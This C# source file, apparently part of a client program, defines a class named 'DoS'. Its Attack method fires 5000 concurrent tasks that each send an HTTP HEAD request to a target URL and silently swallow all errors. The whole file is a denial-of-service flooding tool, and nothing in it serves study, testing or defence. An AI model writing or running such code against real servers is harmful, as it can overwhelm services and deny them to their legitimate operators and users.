
namespace Client3
{

    public static class DoS
    {
      


        private static HttpClient _httpClient = new HttpClient();

        
        public static async Task dos(string url)
        {
            try
            {
                await _httpClient.SendAsync(new HttpRequestMessage(HttpMethod.Head, url));
            }
            catch
            {

            }
        }

        public static void Attack(string url)
        {

            var task = new Task[5000];
            for (int i = 0; i < task.Length; i++)
            {
                task[i] = new Task(() =>
                {
                    dos(url);
                });
                
                task[i].Start();
            }


            

            
        }
    }
}
